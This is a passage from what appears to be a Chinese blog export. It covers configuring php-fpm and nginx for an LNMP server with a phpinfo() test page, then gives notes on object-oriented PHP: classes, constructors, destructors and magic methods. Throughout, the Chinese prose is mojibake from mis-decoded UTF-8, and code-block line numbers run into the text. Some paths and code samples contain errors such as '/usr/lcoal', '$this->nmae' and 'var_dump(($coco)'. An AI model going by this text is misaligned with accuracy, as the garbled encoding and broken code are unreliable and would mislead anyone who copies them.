3.ä¿®æ”¹é…ç½®æ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173locate php-fpm.conf#vim ....æ–‡ä»¶è·¯å¾„##é…ç½®æ–‡ä»¶;include&#x3D;etc&#x2F;fpm.d&#x2F;*.conf;;;;;;;;;;;;;;;;;;; Global Options ;;;;;;;;;;;;;;;;;;;[global];prefix åº”ç”¨æ ¹ç›®å½•åœ¨&#x2F;usr&#x2F;local&#x2F;php56;Pidæ–‡ä»¶ :é»˜è®¤var&#x2F;run&#x2F;php-rpm.pidpid &#x3D; run&#x2F;php-fpm.pid; é”™è¯¯æ—¥å¿— :é»˜è®¤åœ¨var&#x2F;log&#x2F;php-fpm.logerror_log &#x3D; log&#x2F;php-fpm.log; å†™å…¥é”™è¯¯æ—¥å¿—çš„çº§åˆ«ï¼šalert, error, warning, notice(é»˜è®¤), debuglog_level &#x3D; error; è¡¨ç¤ºåœ¨emergency_restart_intervalæ‰€è®¾å€¼å†…å‡ºç°SIGSEGVæˆ–è€…SIGBUSé”™è¯¯çš„php-cgiè¿›ç¨‹æ•°; å¦‚æœè¶…è¿‡ emergency_restart_thresholdä¸ªï¼Œphp-fpmå°±ä¼šä¼˜é›…é‡å¯ã€‚è¿™ä¸¤ä¸ªé»˜è®¤å€¼éƒ½æ˜¯0emergency_restart_threshold &#x3D; 60;å•ä½å¯ä»¥æ˜¯s(econd)(é»˜è®¤),m(minutes),h(hours),d(ays)emergency_restart_interval &#x3D; 60; é™åˆ¶å­è¿›ç¨‹æ¥å—ä¸»è¿›ç¨‹å¤ç”¨ä¿¡å·çš„è¶…æ—¶æ—¶é—´(é»˜è®¤æ˜¯0s); å•ä½: s(econds)(é»˜è®¤å•ä½), m(inutes), h(ours), or d(ays)process_control_timeout &#x3D; 0; æœ€å¤§è¿›ç¨‹æ•°; process.max &#x3D; 128; ä¸»è¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œç”±é«˜åˆ°ä½æ˜¯-19~20; process.priority &#x3D; -19; åå°æ‰§è¡Œfpm,é»˜è®¤å€¼ä¸ºyesï¼Œ; å¦‚æœä¸ºäº†è°ƒè¯•å¯ä»¥æ”¹ä¸ºnoã€‚; åœ¨FPMä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„è®¾ç½®æ¥è¿è¡Œå¤šä¸ªè¿›ç¨‹æ± ã€‚; è¿™äº›è®¾ç½®å¯ä»¥é’ˆå¯¹æ¯ä¸ªè¿›ç¨‹æ± å•ç‹¬è®¾ç½®ã€‚daemonize &#x3D; yes ;;;;;;;;;;;;;;;;;;;;; Pool Definitions ; ;;;;;;;;;;;;;;;;;;;;[www]; Per pool prefix; It only applies on the following directives:; - &#39;access.log&#39;; - &#39;slowlog&#39;; - &#39;listen&#39; (unixsocket); - &#39;chroot&#39;; - &#39;chdir&#39;; - &#39;php_values&#39;; - &#39;php_admin_values&#39;;prefix &#x3D; &#x2F;path&#x2F;to&#x2F;pools&#x2F;$pool; å¯åŠ¨è¿›ç¨‹çš„è´¦æˆ·å’Œç»„user &#x3D; nginxgroup &#x3D; nginx; fpmç›‘å¬ç«¯å£ï¼Œå³nginxä¸­phpå¤„ç†çš„åœ°å€ï¼Œä¸€èˆ¬é»˜è®¤å€¼å³å¯ã€‚; å¸¸ç”¨æ ¼å¼æœ‰ &#39;ip:port&#39;ã€&#39;port&#39;ã€&#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39;listen &#x3D; 127.0.0.1:9000; backlogæ•°ï¼Œ-1è¡¨ç¤ºæ— é™åˆ¶ï¼Œç”±æ“ä½œç³»ç»Ÿå†³å®šï¼Œæ­¤è¡Œæ³¨é‡Šæ‰å°±è¡Œã€‚;listen.backlog &#x3D; 65535; unix socketè®¾ç½®é€‰é¡¹ï¼Œå¦‚æœä½¿ç”¨tcpæ–¹å¼è®¿é—®ï¼Œè¿™é‡Œæ³¨é‡Šå³å¯ã€‚listen.owner &#x3D; nginxlisten.group &#x3D; nginxlisten.mode &#x3D; 0660;listen.acl_users &#x3D;;listen.acl_groups &#x3D; ;listen.allowed_clients &#x3D; 127.0.0.1; process.priority &#x3D; -19; å¦‚ä½•æ§åˆ¶å­è¿›ç¨‹ å¯¹äºä¸“ç”¨æœåŠ¡å™¨ï¼Œpmå¯ä»¥è®¾ç½®ä¸ºstatic; Possible Values:; static - a fixed number (pm.max_children) of child processes;; dynamic - the number of child processes are set dynamically based on the; following directives. With this process management, there will be; always at least 1 children.; pm.max_children - å­è¿›ç¨‹æœ€å¤§æ•°; pm.start_servers - å¯åŠ¨æ—¶çš„è¿›ç¨‹æ•°; pm.min_spare_servers - ä¿è¯ç©ºé—²è¿›ç¨‹æ•°æœ€å°å€¼ï¼Œå¦‚æœç©ºé—²è¿›ç¨‹å°äºæ­¤å€¼ï¼Œåˆ™åˆ›å»ºæ–°çš„å­è¿›ç¨‹; pm.max_spare_servers - ä¿è¯ç©ºé—²è¿›ç¨‹æ•°æœ€å¤§å€¼ï¼Œå¦‚æœç©ºé—²è¿›ç¨‹å¤§äºæ­¤å€¼ï¼Œæ­¤è¿›è¡Œæ¸…ç†; ondemand - no children are created at startup. Children will be forked when; new requests will connect. The following parameter are used:; pm.max_children - the maximum number of children that; can be alive at the same time.; pm.process_idle_timeout - The number of seconds after which; an idle process will be killed.; Note: This value is mandatory.pm &#x3D; dynamicpm.max_children &#x3D; 5pm.start_servers &#x3D; 2pm.min_spare_servers &#x3D; 1pm.max_spare_servers &#x3D; 3;pm.process_idle_timeout &#x3D; 10s; ; è®¾ç½®æ¯ä¸ªå­è¿›ç¨‹é‡ç”Ÿä¹‹å‰æœåŠ¡çš„è¯·æ±‚æ•°. ; å¯¹äºå¯èƒ½å­˜åœ¨å†…å­˜æ³„æ¼çš„ç¬¬ä¸‰æ–¹æ¨¡å—æ¥è¯´æ˜¯éå¸¸æœ‰ç”¨çš„. ; å¦‚æœè®¾ç½®ä¸º &#39;0&#39; åˆ™ä¸€ç›´æ¥å—è¯·æ±‚, ç­‰åŒäº PHP_FCGI_MAX_REQUESTS ç¯å¢ƒå˜é‡. ; é»˜è®¤å€¼: 0pm.max_requests &#x3D; 500; FPMçŠ¶æ€é¡µé¢çš„ç½‘å€. å¦‚æœæ²¡æœ‰è®¾ç½®, åˆ™æ— æ³•è®¿é—®çŠ¶æ€é¡µé¢. é»˜è®¤å€¼: none. muninç›‘æ§ä¼šä½¿ç”¨åˆ°pm.status_path &#x3D; &#x2F;status; ;FPMç›‘æ§é¡µé¢çš„pingç½‘å€. ; å¦‚æœæ²¡æœ‰è®¾ç½®, åˆ™æ— æ³•è®¿é—®pingé¡µé¢. ; è¯¥é¡µé¢ç”¨äºå¤–éƒ¨æ£€æµ‹FPMæ˜¯å¦å­˜æ´»å¹¶ä¸”å¯ä»¥å“åº”è¯·æ±‚. ; è¯·æ³¨æ„å¿…é¡»ä»¥æ–œçº¿å¼€å¤´ (&#x2F;)ã€‚ping.path &#x3D; &#x2F;ping; ç”¨äºå®šä¹‰pingè¯·æ±‚çš„è¿”å›å“åº”. ; è¿”å›ä¸º HTTP 200 çš„ text&#x2F;plain æ ¼å¼æ–‡æœ¬. ; é»˜è®¤å€¼: pong.;ping.response &#x3D; pong; ç™»å½• logaccess.log &#x3D; log&#x2F;$pool.access.log; accessLogæ ¼å¼; Default: &quot;%R - %u %t \\&quot;%m %r\\&quot; %s&quot;access.format &#x3D; &quot;%R - %u %t \\&quot;%m %r%Q%q\\&quot; %s %f %&#123;mili&#125;d %&#123;kilo&#125;M %C%%&quot; ;æ…¢è¯·æ±‚çš„è®°å½•æ—¥å¿—;é…åˆrequest_slowlog_timeoutä½¿ç”¨slowlog &#x3D; log&#x2F;$pool.log.slow ;å½“ä¸€ä¸ªè¯·æ±‚è¯¥è®¾ç½®çš„è¶…æ—¶æ—¶é—´å;å°±ä¼šå°†å¯¹åº”çš„PHPè°ƒç”¨å †æ ˆä¿¡æ¯å®Œæ•´å†™å…¥åˆ°æ…¢æ—¥å¿—ä¸­.;è®¾ç½®ä¸º &#39;0&#39; è¡¨ç¤º &#39;Off&#39;request_slowlog_timeout &#x3D; 0 ; è®¾ç½®å•ä¸ªè¯·æ±‚çš„è¶…æ—¶ä¸­æ­¢æ—¶é—´. ; è¯¥é€‰é¡¹å¯èƒ½ä¼šå¯¹php.iniè®¾ç½®ä¸­çš„&#39;max_execution_time&#39;å› ä¸ºæŸäº›ç‰¹æ®ŠåŸå› æ²¡æœ‰ä¸­æ­¢è¿è¡Œçš„è„šæœ¬æœ‰ç”¨.; è®¾ç½®ä¸º &#39;0&#39; è¡¨ç¤º &#39;Off&#39;.; å½“ç»å¸¸å‡ºç°502é”™è¯¯æ—¶å¯ä»¥å°è¯•æ›´æ”¹æ­¤é€‰é¡¹ã€‚request_terminate_timeout &#x3D; 0 ; è®¾ç½®æ–‡ä»¶æ‰“å¼€æè¿°ç¬¦çš„rlimité™åˆ¶. ; é»˜è®¤å€¼: ç³»ç»Ÿå®šä¹‰å€¼é»˜è®¤å¯æ‰“å¼€å¥æŸ„æ˜¯1024ï¼Œ; å¯ä½¿ç”¨ ulimit -næŸ¥çœ‹ï¼Œulimit -n 2048ä¿®æ”¹ã€‚rlimit_files &#x3D; 1024 ; è®¾ç½®æ ¸å¿ƒrlimitæœ€å¤§é™åˆ¶å€¼. å¯ç”¨å€¼: &#39;unlimited&#39; ã€0æˆ–è€…æ­£æ•´æ•°. é»˜è®¤å€¼: ç³»ç»Ÿå®šä¹‰å€¼.;rlimit_core &#x3D; 0 ; å¯åŠ¨æ—¶çš„Chrootç›®å½•. æ‰€å®šä¹‰çš„ç›®å½•éœ€è¦æ˜¯ç»å¯¹è·¯å¾„. å¦‚æœæ²¡æœ‰è®¾ç½®, åˆ™chrootä¸è¢«ä½¿ç”¨.;chroot &#x3D; ; è®¾ç½®å¯åŠ¨ç›®å½•ï¼Œå¯åŠ¨æ—¶ä¼šè‡ªåŠ¨Chdiråˆ°è¯¥ç›®å½•. ; æ‰€å®šä¹‰çš„ç›®å½•éœ€è¦æ˜¯ç»å¯¹è·¯å¾„. ; é»˜è®¤å€¼: å½“å‰ç›®å½•ï¼Œæˆ–è€…&#x2F;ç›®å½•ï¼ˆchrootæ—¶ï¼‰;chdir &#x3D; &#x2F;var&#x2F;www ; é‡å®šå‘è¿è¡Œè¿‡ç¨‹ä¸­çš„stdoutå’Œstderråˆ°ä¸»è¦çš„é”™è¯¯æ—¥å¿—æ–‡ä»¶ä¸­. ; å¦‚æœæ²¡æœ‰è®¾ç½®, stdout å’Œ stderr å°†ä¼šæ ¹æ®FastCGIçš„è§„åˆ™è¢«é‡å®šå‘åˆ° &#x2F;dev&#x2F;null . ; é»˜è®¤å€¼: ç©º.;catch_workers_output &#x3D; yes;clear_env &#x3D; no;security.limit_extensions &#x3D; .php .php3 .php4 .php5 é…ç½®æ–‡ä»¶ä¸­æ–‡ç¿»è¯‘ [github][https://github.com/HeDefine/PHP.ini-for-Chinese/tree/master] 6.é…ç½®nginxæ”¯æŒphp1234567891011121314151617181920212223242526locate nginx.confvim ..æ–‡ä»¶è·¯å¾„#å°†æ–‡ä»¶ç¬¬45è¡Œä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹index index.php index.html index.htm;#æ–‡ä»¶çš„65-72è¡Œä»£ç å‰çš„æ³¨é‡Šâ€œï¼ƒâ€å»æ‰,å¹¶æ›¿æ¢&quot;root&quot;å’Œâ€œfastcgi_paramâ€å‚æ•°å€¼ä¹Ÿå°±æ˜¯ï¼Œä½¿ç”¨&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;htmlä½œä¸ºç½‘ç«™æ ¹ç›®å½•location ~ \\.php$ &#123; root &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html$fastcgi_script_name; include fastcgi_params; &#125;locate php.inivim ..æ–‡ä»¶è·¯å¾„#åœ¨ç»“å°¾çš„â€œï¼›Local Variablesï¼šâ€ä¹‹å‰æ·»åŠ å¦‚ä¸‹å†…å®¹cgi.fix_pathinfo &#x3D; 1killall -9 php-fpmkillall -9 nginxnginxphp-fpm#é‡å¯(ä¸ä¼šå†™è„šæœ¬)netstat -ntlp #æŸ¥çœ‹ç«¯å£æ˜¯å¦å¯ç”¨å¹¶è¢«php-fpmä»¥åŠnginxä½¿ç”¨ 7.æŸ¥çœ‹LNMPç½‘ç«™ç¯å¢ƒ12345678910111213cd &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;htmltouch info.phpvim info.php#åŠ å…¥ä¸‹é¢å†…å®¹&lt;?php phpinfo();?&gt;#å†™å…¥é€€å‡ºECS:wq#è®¿é—®http:&#x2F;&#x2F;ip&#x2F;info.php#æµ‹è¯•æ˜¯å¦è§£æphpï¼Œè‹¥æˆåŠŸï¼Œåˆ™é…ç½®å®Œæˆ 8.å¸¸è§é—®é¢˜è®¿é—®ä¸åˆ°ç½‘ç«™? æ£€æŸ¥é˜²ç«å¢™é…ç½®å¹¶pingæœåŠ¡å™¨IPã€telnetæœåŠ¡å™¨80ç«¯å£æµ‹è¯•è¿é€šæ€§ èƒ½è®¿é—®åˆ°htmlæ–‡ä»¶å´è®¿é—®ä¸åˆ°phpæ–‡ä»¶? å®‰è£…phpå’Œé…ç½®nginxæ”¯æŒphpçš„æ­¥éª¤æ˜¯å¦æ­£ç¡®ã€‚ //FILE FAILD FIND æ˜¯ç”±äºnginxé…ç½®æ²¡æœ‰é…å¥½ //æ‰€æœ‰ç»“æŸåï¼Œåˆ é™¤info.php 9.å‚è€ƒæ–‡çŒ®[æ‰‹åŠ¨é…ç½®LNMP][https://www.jianshu.com/p/292514f97944] [é˜¿é‡Œäº‘å¼€æ”¾å®éªŒå®¤][https://edu.aliyun.com/lab/courses/14107e607fe742a88a60d1148d7b405c/detail?purchaseRecordId=4eddcaf58df543d9b96af97a5b2d9342] 0.æ‰©å±•[Nginx - ç»´åŸºç™¾ç§‘][https://zh.wikipedia.org/wiki/Nginx] [8åˆ†é’Ÿå¸¦ä½ æ·±å…¥æµ…å‡ºææ‡‚Nginx][https://zhuanlan.zhihu.com/p/34943332] [PHPMyadmin é…ç½®æ–‡ä»¶è¯¦è§£(é…ç½®)][https://www.jb51.net/article/21228.html]","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"PHPé¢å‘å¯¹è±¡","date":"2019-05-19T16:00:00.000Z","path":"2019/05/20/Note/PHPé¢å‘å¯¹è±¡/","text":"PHPé¢å‘å¯¹è±¡ä¸ºä»€ä¹ˆè¦é¢å‘å¯¹è±¡é¢å‘å¯¹è±¡çš„å¥½å¤„è¿œè¿œä¸åªæ˜¯ä¾¿äºç»´æŠ¤ä»£ç ï¼Œä»–æ‰€ä½“ç°çš„é¢å‘å¯¹è±¡çš„æ€æƒ³å°†ä¸€ä¸ªä½“ç³»åˆ†ä½œå¾ˆå¤šçš„ä¸ªä½“ï¼Œè¿™æ ·æ¥ï¼Œåˆ«äººåªéœ€è¦çŸ¥é“æ€ä¹ˆè°ƒç”¨ä½ æ‰€å†™çš„ç±»æˆ–å¯¹è±¡ã€‚ ç±»å’Œå¯¹è±¡ï¼šç±»ï¼š å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ã€‚ç±»çš„å®šä¹‰åŒ…å«äº†æ•°æ®çš„å½¢å¼ä»¥åŠå¯¹æ•°æ®çš„æ“ä½œã€‚å¯¹è±¡ï¼šæ˜¯ç±»çš„å®ä¾‹ã€‚å…·ä½“ä¸€ç‚¹ï¼Œæœ‰ä¸€ä¸ªç±»æ˜¯äººç±»ï¼Œè¿™ä¸ªäººç±»å°±æ˜¯æŠ½è±¡çš„ï¼Œè€Œå¼ ä¸‰è¿™ä¸ªäººå°±æ˜¯å®ä¾‹åŒ–çš„å¯¹è±¡ã€‚ç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿ï¼Œå¯¹è±¡æ˜¯ç±»çš„å®ä¾‹æˆå‘˜å˜é‡ âˆ’ å®šä¹‰åœ¨ç±»å†…éƒ¨çš„å˜é‡ã€‚è¯¥å˜é‡çš„å€¼å¯¹å¤–æ˜¯ä¸å¯è§çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æˆå‘˜å‡½æ•°è®¿é—®ï¼Œåœ¨ç±»è¢«å®ä¾‹åŒ–ä¸ºå¯¹è±¡åï¼Œè¯¥å˜é‡å³å¯ç§°ä¸ºå¯¹è±¡çš„å±æ€§ã€‚ç±»ç»“æ„ 1234class classname&#123;&#125; ç±»çš„åŸºæœ¬å®šä¹‰ï¼š 12345class classname&#123; æˆå‘˜å±æ€§&#x2F;&#x2F;å‰é¢æœ‰è®¿é—®æ§åˆ¶ç¬¦ public protected private æˆå‘˜æ–¹æ³•&#125; åˆ›å»ºå¯¹è±¡ 1$å¯¹è±¡å &#x3D; new ç±»åï¼ˆï¼‰ï¼› ç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œé‡‡ç”¨é©¼å³°å¼ è®¿é—®å¯¹è±¡çš„å±æ€§ 1$å¯¹è±¡å-&gt;$å±æ€§å å¯¹è±¡ä¼ é€’æœºåˆ¶è¯´æ˜å¯¹è±¡ä¼ é€’çš„ä¸æ˜¯æ•°æ®æœ¬èº«ï¼Œè€Œæ˜¯å¯¹è±¡æ ‡è¯†ç¬¦è¿™é‡Œæœ‰ä¸¤ä¸ªæœ‰è¶£çš„ä¾‹å­ 123456789101112131415class cat&#123; public $name; public $age; public $color;&#125;$a &#x3D; new cat();$a-&gt;name &#x3D; &#39;Tom&#39;;$a-&gt;age &#x3D; &#39;2&#39;;$a-&gt;color &#x3D; &#39;red&#39;;$b &#x3D; $a;echo $b-&gt;color;$b-&gt;name &#x3D; &quot;Sam&quot;;echo $a-&gt;name; åœ¨è¿™é‡Œï¼Œä½ ä¼šå‘ç°è¾“å‡ºçš„açš„nameå±…ç„¶éšç€bçš„ä¿®æ”¹è€Œå˜åŒ–äº†è¿™æ˜¯åº”ä¸ºï¼Œè¿™ç§ä¼ å€¼æ˜¯ä¼ å¯¹è±¡æ ‡è¯†ç¬¦ï¼Œç›¸å½“äºåœ¨åˆ›å»º$açš„æ—¶å€™å°±åˆ›å»ºäº†ä¸€ä¸ª#1çš„å¯¹è±¡æ ‡è¯†ç¬¦ï¼Œå¯¹$bæ¥è¯´ä»–åªæ˜¯å¤åˆ¶äº†ä¸€ä»½å’Œ$aä¸€æ¨¡ä¸€æ ·çš„å¯¹è±¡æ ‡è¯†ç¬¦æŒ‡å‘æ•°æ®å­˜å‚¨çš„ä½ç½®ï¼Œæ‰€ä»¥ä¼šå¾—åˆ°é‚£ç§ç»“æœå•¦ ä¸‹é¢è¿™ä¸ªæœ‰ç‚¹ä¸åŒï¼Œä»”ç»†åˆ†æä¸€ä¸‹ç»“æœå§ 123456789101112131415class cat&#123; public $name; public $age; public $color;&#125;$a &#x3D; new cat();$a-&gt;name &#x3D; &#39;Tom&#39;;$a-&gt;age &#x3D; &#39;2&#39;;$a-&gt;color &#x3D; &#39;red&#39;;$b &#x3D; &amp;$a;&#x2F;&#x2F;ä¼ å€$b &#x3D; &#39;blue&#39;;echo $a-&gt;color;&#x2F;&#x2F;ä¼šæŠ¥é”™å“¦echo $a; æˆå‘˜å‡½æ•°åŸºæœ¬æ ·å¼ 123456class classname&#123; è®¿é—®ä¿®é¥°ç¬¦ function å‡½æ•°å(å‚æ•°)&#123; alalalal; &#125;&#125; æ„é€ å‡½æ•°åœ¨classé‡Œé¢çš„æ„é€ å‡½æ•°æ„é€ å‡½æ•°å˜›ï¼Œç”¨äºåˆ›å»ºå¯¹è±¡æ—¶ç»™å±æ€§èµ‹åˆå§‹å€¼å’Œè°ƒç”¨æˆå‘˜å‡½æ•°æ„é€ å‡½æ•°çš„è®¿é—®ä¿®é¥°ç¬¦é»˜è®¤ä¸ºpublicæ²¡æœ‰è¿”å›å€¼ä¸€ä¸ªç±»ä¸­åªèƒ½æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°æ ·å¼ï¼š 12345678910class classname&#123; public $color; public $age; è®¿é—®ä¿®é¥°ç¬¦ function __construct($param_color,$param_age)&#123; $this-&gt;color &#x3D; $param_color; $this-&gt;age &#x3D; $param_age;&#x2F;&#x2F;$thisä»£è¡¨è°ƒç”¨è¿™ä¸ªæ„é€ å‡½æ•°çš„å¯¹è±¡ &#125;&#125;$coco &#x3D; new classname(&#39;red&#39;,&#39;12&#39;);&#x2F;&#x2F;åœ¨åˆ›å»ºè¿™ä¸ªæ–°çš„å¯¹è±¡Cocoæ—¶ç³»ç»Ÿè‡ªåŠ¨å®Œæˆäº†å¯¹è±¡çš„å±æ€§å®šä¹‰ ææ„å‡½æ•°ææ„å‡½æ•°(destructor) ä¸æ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡ç»“æŸå…¶ç”Ÿå‘½å‘¨æœŸæ—¶ï¼ˆä¾‹å¦‚å¯¹è±¡æ‰€åœ¨çš„å‡½æ•°å·²è°ƒç”¨å®Œæ¯•ï¼‰ï¼Œç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œææ„å‡½æ•°é‡Šæ”¾èµ„æºï¼Œå…³é—­æ–‡ä»¶é»˜è®¤æƒ…å†µä¸‹ï¼Œå…ˆåˆ›å»ºçš„å¯¹è±¡åé”€æ¯ï¼ˆæ ˆåŒºçš„åˆ†é…ï¼‰ 123456class classname&#123; function __destruct()&#123;&#x2F;&#x2F;No param &#125;&#125; åœ¨ç¨‹åºç»“æŸå‰ä¹Ÿä¼šé”€æ¯å¯¹è±¡å½“æ²¡æœ‰å˜é‡æŒ‡å‘å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±ä¼šè¢«é”€æ¯åœ¨é”€æ¯æ—¶å°±ä¼šè°ƒç”¨ææ„å‡½æ•°ææ„å‡½æ•°å¹¶ä¸æ˜¯é”€æ¯å¯¹è±¡æœ¬èº«ï¼Œè€Œæ˜¯é”€æ¯å¯¹è±¡åˆ›é€ çš„ç›¸å…³èµ„æºï¼Œå¦‚æ•°æ®åº“è¿æ¥PHPçš„å†…å­˜å›æ”¶æœºåˆ¶ 123456789101112131415&lt;?phpclass test&#123; function __destruct()&#123; echo &quot;å½“å¯¹è±¡é”€æ¯æ—¶ä¼šè°ƒç”¨ï¼ï¼ï¼&quot;; &#125;&#125;$a &#x3D; $b &#x3D; $c &#x3D; new test();$a &#x3D; null;unset($b);echo &quot;&lt;hr &#x2F;&gt;&quot;;?&gt; æ­¤ä¾‹å­ï¼Œå¦‚ä¸Šå›¾ï¼Œæœ‰ä¸‰ä¸ªå˜é‡å¼•ç”¨$a,$b,$cæŒ‡å‘testå¯¹è±¡ï¼Œtestå¯¹è±¡å°±æœ‰3ä¸ªå¼•ç”¨è®¡æ•°ï¼Œå½“$a = nullæ—¶ï¼Œ$aå¯¹testå¯¹è±¡çš„å¼•ç”¨ä¸¢å¤±ï¼Œè®¡æ•°-1ï¼Œå˜ä¸º2ï¼Œå½“$bè¢«unset()æ—¶ï¼Œ$bå¯¹testå¯¹è±¡çš„å¼•ç”¨ä¹Ÿä¸¢å¤±äº†ï¼Œè®¡æ•°å†-1ï¼Œå˜ä¸º1ï¼Œæœ€åé¡µé¢åŠ è½½å®Œæ¯•ï¼Œ$cæŒ‡å‘testå¯¹è±¡çš„å¼•ç”¨è‡ªåŠ¨è¢«é‡Šæ”¾ï¼Œæ­¤æ—¶è®¡æ•°å†-1ï¼Œå˜ä¸º0ï¼Œtestå¯¹è±¡å·²æ²¡æœ‰å˜é‡å¼•ç”¨ï¼Œå°±ä¼šè¢«é”€æ¯ï¼Œæ­¤æ—¶å°±ä¼šè°ƒç”¨ææ„å‡½æ•°ã€‚è®¿é—®ä¿®é¥°ç¬¦åˆè®²ç±»ä¸­çš„æ–¹æ³•å¯ä»¥è¢«å®šä¹‰ä¸ºå…¬æœ‰ï¼ˆpublicï¼‰ï¼Œç§æœ‰(private)æˆ–å—ä¿æŠ¤(protected)ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¿™äº›å…³é”®å­—ï¼Œåˆ™è¯¥æ–¹æ³•é»˜è®¤ä¸ºå…¬æœ‰ã€‚å…¶ä¸­ï¼Œpublicå®šä¹‰çš„æ–¹æ³•æˆ–å±æ€§åœ¨ç±»çš„å†…éƒ¨å’Œå¤–éƒ¨éƒ½å¯ä»¥è°ƒç”¨æˆ–è¯»å–privateå’Œprotectedåªèƒ½åœ¨ç±»çš„å†…éƒ¨è°ƒç”¨æˆ–è¯»å–ï¼Œä»–ä»¬çš„ä¸åŒåé¢è®²è§£ã€‚ é­”æœ¯æ–¹æ³•__set()è°ƒç”¨æ¡ä»¶ï¼šåœ¨ç±»çš„å¤–éƒ¨å¯¹å—ä¿æŠ¤çš„æˆ–è€…ç§æœ‰çš„å±æ€§èµ‹å€¼å¯ä»¥å¯¹ç¨‹åºæœ‰æ›´å¥½çš„æ§åˆ¶ 123456789101112131415161718192021class Dog&#123; public $name; public $age; public $sex; public function __construct($name,$sex)&#123;&#x2F;&#x2F;è¿™é‡Œæ²¡æœ‰é—®é¢˜ï¼Œ$sexåªæ˜¯ä¸ªå‚æ•°å“¦ï¼Œä»€ä¹ˆåå­—éƒ½è¡Œ $this-&gt;name &#x3D; $name;&#x2F;&#x2F;ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œè¿˜æ˜¯å°½é‡è§„èŒƒå‚æ•°çš„å‘½å $this-&gt;age &#x3D; $sex; &#125; public function __set($name,$value)&#123; $this-&gt;$name &#x3D; $value; &#125;&#125;&#x2F;&#x2F;åœ¨ç±»çš„å¤–éƒ¨$coco &#x3D; new Dog(&quot;titi&quot;,1);echo $coco-&gt;name;echo $coco-&gt;age;$coco-&gt;age &#x3D; 2;$coco-&gt;name&#x3D;&quot;coco&quot;;echo $coco-&gt;name;echo $coco-&gt;age; ä¸å…‰å¯ä»¥å¯¹å…¶èµ‹å€¼ï¼Œè¿˜å¯ä»¥å®Œæˆå¯¹å€¼çš„ä¸€äº›æ“ä½œæ¯”å¦‚åˆ¤æ–­è¦ä¿®æ”¹çš„å€¼æ˜¯å¦ç¬¦åˆä¿®æ”¹è¦æ±‚ç­‰ç­‰ï¼Œä¸‹é¢çš„å‡ ä¸ªé­”æœ¯æ–¹æ³•ä¹Ÿä¸€æ ·__getè°ƒç”¨æ¡ä»¶ï¼šåœ¨ç±»çš„å¤–éƒ¨å¾—åˆ°å—ä¿æŠ¤çš„æˆ–ç§æœ‰çš„å±æ€§çš„å€¼ 1234567891011121314151617class Dog&#123; public $name; private $age; public function __construct($value1,$value2)&#123; $this-&gt;nmae &#x3D; $value1; $this-&gt;age&#x3D; $value2; &#125; public function __get($name)&#123; return $this-&gt;$name; &#125;&#125;&#x2F;&#x2F;åœ¨ç±»çš„å¤–éƒ¨$coco &#x3D; new Dog(&quot;titi&quot;,1);echo $coco-&gt;name;echo $coco-&gt;age; __isset()è°ƒç”¨æ¡ä»¶ï¼šåœ¨å¤–éƒ¨ isset()å—ä¿æŠ¤çš„æˆ–è€…ç§å¯†çš„å±æ€§ 123456789101112131415class Dog&#123; public $name; private $age; public function __construct($name,$age)&#123; $this-&gt;nmae &#x3D; $name; $this-&gt;age &#x3D; $age; &#125; public function __isset($name)&#123; isset($this-&gt;$name); &#125;&#125;&#x2F;&#x2F;åœ¨ç±»çš„å¤–éƒ¨$coco &#x3D; new Dog(&quot;titi&quot;,1);var_dump(isset($coco-&gt;age));&#x2F;&#x2F;è¿™ä¸ªè¿”å›true æˆ–è€…faulse __unsetè°ƒç”¨æ¡ä»¶ï¼šåœ¨å¤–éƒ¨é‡Šæ”¾å—ä¿æŠ¤çš„æˆ–è€…ç§å¯†çš„å±æ€§ 12345678910111213141516class Dog&#123; public $name; private $age; public function __construct($name,$sex)&#123; $this-&gt;nmae &#x3D; $name; $this-&gt;sex &#x3D; $sex; &#125; public function __unset($name)&#123; unset($this-&gt;$name); &#125;&#125;&#x2F;&#x2F;åœ¨ç±»çš„å¤–éƒ¨$coco &#x3D; new Dog(&quot;titi&quot;,1);unset($coco-&gt;$age);var_dump(($coco); ç»§æ‰¿çˆ¶ç±»ï¼šä¸€ä¸ªç±»è¢«å…¶ä»–ç±»ç»§æ‰¿ï¼Œå¯å°†è¯¥ç±»ç§°ä¸ºçˆ¶ç±»ï¼Œæˆ–åŸºç±»ï¼Œæˆ–è¶…ç±»ã€‚å­ç±»ï¼šä¸€ä¸ªç±»ç»§æ‰¿å…¶ä»–ç±»ç§°ä¸ºå­ç±»ï¼Œä¹Ÿå¯ç§°ä¸ºæ´¾ç”Ÿç±»ã€‚è®¿é—®ä¿®é¥°ç¬¦è¡¥å……ï¼špublic,protectedä¿®é¥°çš„æ–¹æ³•å’Œå±æ€§å¯è¢«ç»§æ‰¿ï¼Œè€Œprivateä¸å¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒPHPä¸­ï¼Œå¦‚æœåœ¨å­ç±»ä¸­åˆ›å»ºäº†æ„é€ å‡½æ•°ï¼Œåˆ™å­ç±»ä¸ä¼šåœ¨æ„é€ å‡½æ•°ä¸­éšå¼è°ƒç”¨çˆ¶ç±»ä¸­çš„æ„é€ 